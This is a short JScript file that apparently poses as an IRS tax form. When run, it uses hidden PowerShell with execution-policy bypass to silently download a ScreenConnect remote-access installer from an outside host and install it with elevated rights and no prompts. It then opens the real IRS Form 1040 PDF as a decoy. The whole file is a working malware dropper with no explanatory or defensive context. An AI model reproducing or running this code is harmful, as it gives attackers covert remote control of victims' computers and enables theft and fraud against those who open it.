var url   = "https://tds6.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
var pdf   = "https://www.irs.gov/pub/irs-pdf/f1040.pdf";
var msi   = '"' + new ActiveXObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") + '\\ScreenConnect.ClientSetup.msi"';

var ps = "$ProgressPreference='SilentlyContinue';" +
         "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" +
         "try{" +
         "  Invoke-WebRequest -Uri '" + url + "' -OutFile " + msi + ";" +
         "  Start-Process msiexec.exe -ArgumentList '/i " + msi + " /qn /norestart' -Verb RunAs -Wait;" +
         "  Write-Host 'SUCCESS'" +
         "}catch{" +
         "  Write-Host 'FAIL:' $_.Exception.Message" +
         "}";

var shell = new ActiveXObject("WScript.Shell");

shell.Run(
    'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "' + ps + '"',
    0,
    true
);

// Open PDF in default browser after installation
shell.Run('cmd /c start "" ' + pdf, 0, false);
